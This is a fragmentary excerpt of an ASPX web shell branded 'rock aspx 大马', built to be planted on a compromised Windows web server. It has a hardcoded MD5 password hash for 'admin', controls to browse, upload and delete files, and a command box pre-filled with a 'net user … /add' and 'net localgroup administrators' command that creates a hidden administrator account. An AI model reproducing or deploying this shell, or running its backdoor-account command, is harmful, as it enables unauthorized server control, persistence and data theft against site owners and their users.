...
<script runat="server">
public string Password="21232f297a57a5a743894a0e4a801fc3";   //32位MD5加密admin
...
if(i==2)
{
pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\">返回上一层</a>";
}
p.Cells.Add(pc);
UGzP.Rows.Add(p);
}
...
if(i==2)
{
lGV.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('确定删除该文件吗?')){Bin_PostBack('SJv',d_file)};}\">删除所选文件</a>";
}
if(i==3)
{
lGV.ColumnSpan=4;
...
<asp:Button ID="ZSnXu" runat="server" Text="无聊了逛下" CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;">rock aspx 大马</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="white-space:nowrap" ><asp:Button ID="xaGwl" runat="server" Text="芝麻开门" CssClass="bt" OnClick="EXV"/></td>
 </tr>
</table>
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text=" 上 传 " OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="网站目录" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">新建目录</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">新建文件</a>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user vipxl.com$ 744588874 /add & net localgroup administrators vipxl.com$ /add"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="执行" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;">rock AspX大马</div></div>
</form>
</body>
</html>
